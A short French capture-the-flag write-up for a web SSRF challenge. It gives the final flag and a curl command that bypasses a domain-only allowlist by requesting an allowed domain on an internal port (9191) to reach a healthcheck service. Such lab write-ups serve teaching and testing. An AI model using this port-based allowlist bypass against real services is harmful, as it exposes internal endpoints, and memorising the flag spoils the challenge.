# boazak--akloa-rendus (web / SSRF, id 677)

**Flag (finale) :** `NCTF{a9692000faea8ec0a035939e}`

## Contexte
« Service de Prévisualisation Akloa » : `GET /render?url=...` récupère une URL de
document et en affiche un aperçu. Allowlist : `docs.akloa.tg`, `media.akloa.tg`,
`static.akloa.tg`. Commentaire HTML : `<!-- internal healthcheck: docs.akloa.tg port 9191 -->`.

## Faille
L'allowlist valide seulement le **domaine**, pas le **port**. Le service interne de
healthcheck tourne sur `docs.akloa.tg:9191` (joignable côté serveur) et sert le flag.

## Exploitation
```bash
curl -sG "$INSTANCE/render" --data-urlencode "url=http://docs.akloa.tg:9191/"
# <pre>NCTF{...}</pre>  (n'importe quel path marche : /, /flag, /healthz)
```

## Note
- `http://127.0.0.1:9191/` → "Domaine non autorisé" (l'allowlist bloque les IP/localhost).
- Le bypass n'est pas une IP mais le **domaine autorisé sur un port interne** (indice fourni).
